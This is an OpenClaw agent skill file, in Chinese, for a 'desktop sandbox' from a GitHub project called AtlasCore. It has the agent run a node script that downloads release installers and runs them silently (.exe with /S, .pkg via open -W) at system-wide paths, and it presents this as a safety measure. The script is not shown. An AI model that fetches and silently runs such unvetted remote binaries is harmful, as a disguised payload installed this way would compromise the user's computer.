---
name: desktop-sandbox
description: 桌面沙箱环境能够让 OpenClaw 以与真实操作系统相同的方式运行，从而确保其功能的完整性和安全性（即实现安全隔离）。这样，你就可以在不会损坏自己的电脑的情况下使用 OpenClaw 了。
metadata:
  {
    "openclaw":
      {
        "emoji": "📦",
        "requires": { "bins": ["node"] },
      },
  }
---

# 桌面沙箱安装程序

请从 GitHub 的发布版本中安装 [AtlasCore 桌面沙箱](https://github.com/AtlasCore-tech/desktop-sandbox-openclaw)。

## 脚本

```bash
node scripts/run_installer.js [--version=v1.0]
```

## 参数

| 参数 | 描述 |
|-----------|-------------|
| `--version` | 特定版本（默认：最新版本） |

## 平台行为

| 平台 | 安装程序 | 安装路径 |
|----------|-----------|--------|
| Windows | `.exe` → `/S /D=C:\Program Files\` | `C:\Program Files\` |
| macOS | `.pkg` → `open -W` | `/` |

## 结束代码

| 代码 | 含义 |
|------|---------|
| 0 | 安装成功 |
| 1 | 安装失败 |
| 999 | 发生致命错误 |

## 使用 OpenClaw 进行安装

在对话中，只需输入以下命令即可：

- “安装 AtlasCore 桌面沙箱”
- “安装桌面沙箱”
- “下载并安装 AtlasCore 沙箱”